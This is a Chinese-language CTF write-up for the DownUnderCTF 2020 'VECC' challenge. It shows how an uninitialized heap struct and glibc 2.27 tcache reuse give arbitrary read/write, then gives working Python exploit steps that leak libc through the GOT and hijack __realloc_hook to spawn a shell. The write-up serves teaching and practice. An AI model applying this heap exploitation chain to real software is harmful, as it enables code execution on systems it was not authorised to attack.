# DownUnderCTF 2020 - VECC

## 题目简述

程序实现了类似动态数组的 `vecc`：结构体保存 `buffer`、`len`、`capacity`，用户可以创建、销毁、追加、清空和显示。索引与追加边界表面上都经过检查，真正漏洞是 `create_vecc()` 只执行 `malloc(sizeof(vecc))`，没有初始化新结构体。通过 glibc 2.27 tcache 的残留数据可令一个 `vecc` 的缓冲区指向另一个 `vecc` 结构体，最终获得任意读写。

## 解题过程

结构体与创建函数为：

```c
typedef struct {
    uint8_t *buffer;
    uint32_t len;
    uint32_t capacity;
} vecc;

void create_vecc() {
    int index = get_index();
    table[index] = malloc(sizeof(vecc));
}
```

`vecc` 和长度为 `0x10` 的临时/数据缓冲区都会落入同一 tcache 尺寸类。按下面顺序整理堆：

```python
create_vecc(0)
append_vecc(0, b"A" * 0x10)
destroy_vecc(0)

create_vecc(1)
create_vecc(2)
create_vecc(3)
```

销毁 0 时，数据缓冲区和结构体先后进入 tcache。`free` 会把空闲链表 `fd` 写入 chunk 的前 8 字节，却保留其余用户数据；再次分配且不清零后，`vecc 2` 的 `buffer` 恰好指向承载 `vecc 3` 的 chunk，而 `len`、`capacity` 仍是原来的 `0x41414141`。

`clear(2)` 只把 `len` 归零，随后向 2 追加 16 字节时不会扩容，而会把数据直接写进 3 的结构体。于是可以随意设置 3 的三个字段：

```python
def point_vecc3(addr, length, capacity=0x41414141):
    clear_vecc(2)
    append_vecc(2, p64(addr) + p32(length) + p32(capacity))

point_vecc3(elf.got["puts"], 8)
puts_addr = u64(show_vecc(3, 8))
```

令 `buffer=目标地址, len=8` 后，`show(3)` 是任意读；令 `len=0` 且保持足够大的 `capacity`，再 `append(3, data)` 则是任意写。利用 GOT 泄露 `puts` 后，根据题目随附 glibc 2.27 计算：

```python
libc_base = puts_addr - 0x809c0
system = libc_base + 0x4f440
realloc_hook = libc_base + 0x3ebc28
bin_sh = libc_base + 0x1b3e9a
```

先把 `__realloc_hook` 改为 `system`：

```python
point_vecc3(realloc_hook, 0)
append_vecc(3, p64(system))
```

再把 3 伪造成一个已满的向量：`buffer` 指向 libc 中的 `/bin/sh`，`len=capacity=8`。追加任意一个字节会触发：

```c
v->buffer = realloc(v->buffer, next);
```

在该 glibc 版本中，`__realloc_hook` 接收的第一个参数就是原指针，于是实际调用变成 `system("/bin/sh")`：

```python
point_vecc3(bin_sh, 8, 8)
append_vecc(3, b"A", readline=False)
```

进入 shell 后得到：

```text
DUCTF{h@v_2_z3r0_ur_all0ca710n5}
```

`__realloc_hook` 已在新版本 glibc 中移除，因此这条收尾链只适用于题目所给 libc；任意读写原语本身仍是漏洞的核心。

## 方法总结

本题没有传统越界、UAF 菜单项或 double free，利用完全依赖“分配后的结构体未初始化”。分析自定义容器时必须检查构造函数是否为指针、长度和容量建立不变量。若结构体与其数据缓冲区进入同一 tcache 尺寸类，残留的 `fd` 和旧数据就可能把两个对象串成可控的对象重叠，进而升级为任意读写。
